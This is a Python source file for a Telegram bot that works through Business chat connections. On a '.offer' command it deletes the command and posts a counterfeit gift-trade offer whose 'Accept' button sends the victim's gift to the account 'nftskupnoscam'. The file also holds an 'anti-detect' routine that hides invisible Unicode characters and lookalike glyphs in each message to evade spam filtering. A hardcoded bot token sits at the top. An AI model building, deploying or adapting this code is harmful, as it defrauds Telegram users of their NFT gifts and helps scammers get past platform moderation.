import telebot
import re
import random
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, MessageEntity

BOT_TOKEN = "8957995978:AAEMJv04pvmQPuTppLDKLQoescjezii5ulY"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

STAR_EMOJI_ID = "5920281855378068765"
GIFT_EMOJI_ID = "5931409969613116639"

# ─── антидетект: variation selectors + invisible + math bold ─────────────────
_VS  = [chr(0xFE00 + i) for i in range(16)]
_INV = ['\u200b','\u200c','\u200d','\u2060','\u2062','\u2063',
        '\ufeff','\u00ad','\u034f','\u180e','\u2061','\u2064']

_BOLD_MAP = {
    'а':'𝗮','б':'б','в':'𝘃','г':'г','д':'д','е':'𝗲','ё':'ё','ж':'ж',
    'з':'з','и':'𝗶','й':'й','к':'𝗸','л':'л','м':'𝗺','н':'𝗻','о':'𝗼',
    'п':'п','р':'𝗿','с':'𝘀','т':'𝘁','у':'𝘂','ф':'ф','х':'х','ц':'ц',
    'ч':'ч','ш':'ш','щ':'щ','ъ':'ъ','ы':'ы','ь':'ь','э':'э','ю':'ю','я':'я',
    'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛',
    'I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣',
    'Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫',
    'Y':'𝗬','Z':'𝗭',
    'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵',
    'i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽',
    'q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅',
    'y':'𝘆','z':'𝘇',
    '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳',
    '8':'𝟴','9':'𝟵',
}

_PUNCT = {
    '.': ['．','⸼','·','.'],
    ',': ['，','‚',','],
    '!': ['！','ǃ','!'],
    '?': ['？','ʔ','?'],
    ':': ['：','꞉',':'],
    '-': ['‐','‑','–','-'],
}

def bold_font(text: str) -> str:
    """Math bold + variation selector после каждого символа."""
    out = []
    for ch in text:
        out.append(_BOLD_MAP.get(ch, ch))
        if random.random() < 0.85:
            out.append(random.choice(_VS))
    return ''.join(out)

def unique_text(text: str) -> str:
    """
    Уникализация без изменения видимого текста:
    - variation selector после 70% символов
    - 1-2 invisible после каждого пробела
    - ротация пунктуации
    """
    out = []
    for ch in text:
        if ch == '\n':
            out.append('\n')
            continue
        if ch == ' ':
            out.append(' ')
            out.append(random.choice(_INV))
            if random.random() < 0.5:
                out.append(random.choice(_VS))
            continue
        if ch in _PUNCT:
            out.append(random.choice(_PUNCT[ch]))
            continue
        out.append(ch)
        if random.random() < 0.70:
            out.append(random.choice(_VS))
        if random.random() < 0.12:
            out.append(random.choice(_INV))
    return ''.join(out)

# ─── helpers ──────────────────────────────────────────────────────────────────

def offer_keyboard():
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✗ Отклонить", callback_data="decline"),
        InlineKeyboardButton("✓ Принять",   url="tg://send_gift?to=nftskupnoscam")
    )
    return kb

# ─── business connection handler ──────────────────────────────────────────────

@bot.business_connection_handler()
def on_business_connect(bc):
    bot.send_message(
        bc.user_chat_id,
        unique_text(
            f"✅ Business подключён\n"
            f"user_id: {bc.user_chat_id}\n"
            f"business_connection_id: {bc.id}"
        )
    )

# ─── .offer в бизнес чате ─────────────────────────────────────────────────────

@bot.business_message_handler(regexp=r'^\.offer\s+(\d+)\s+(\S+)$')
def fake_offer(message):
    m        = re.match(r'^\.offer\s+(\d+)\s+(\S+)$', message.text)
    stars    = m.group(1)
    nft_url  = m.group(2)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-', ' ').title() or "Xmas Stocking"
    bc_id    = message.business_connection_id
    chat_id  = message.chat.id

    try:
        bot.delete_message(chat_id, message.message_id,
                           business_connection_id=bc_id)
    except Exception:
        pass

    p1      = unique_text("Пользователь предлагает Вам\n")
    p_stars = bold_font(stars)
    p_star  = " ⭐"
    p2      = unique_text(" за подарок ")
    p_nft   = nft_name
    p3      = unique_text(".\n\nПредложение действует ещё ")
    p_time  = bold_font("6 ч. 0 мин.")
    p4      = unique_text("..")

    text = p1 + p_stars + p_star + p2 + p_nft + p3 + p_time + p4

    off_stars = len(p1)
    off_star  = len(p1 + p_stars + " ")
    off_nft   = len(p1 + p_stars + p_star + p2)
    off_time  = len(p1 + p_stars + p_star + p2 + p_nft + p3)

    entities = [MessageEntity(**e) for e in [
        {"type": "bold",         "offset": off_stars, "length": len(p_stars)},
        {"type": "custom_emoji", "offset": off_star,  "length": 1,
         "custom_emoji_id": STAR_EMOJI_ID},
        {"type": "text_link",    "offset": off_nft,   "length": len(p_nft), "url": nft_url},
        {"type": "bold",         "offset": off_time,  "length": len(p_time)},
    ]]

    time.sleep(random.uniform(0.3, 1.1))

    bot.send_message(
        chat_id, text,
        entities=entities,
        reply_markup=offer_keyboard(),
        business_connection_id=bc_id
    )

# ─── callback: Отклонить ──────────────────────────────────────────────────────

@bot.callback_query_handler(func=lambda c: c.data == "decline")
def decline(call):
    bot.answer_callback_query(call.id, "Предложение отклонено.")
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

# ─── run ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("Bot started")
    bot.infinity_polling(
        allowed_updates=[
            "message",
            "business_message",
            "business_connection",
            "callback_query",
        ]
    )
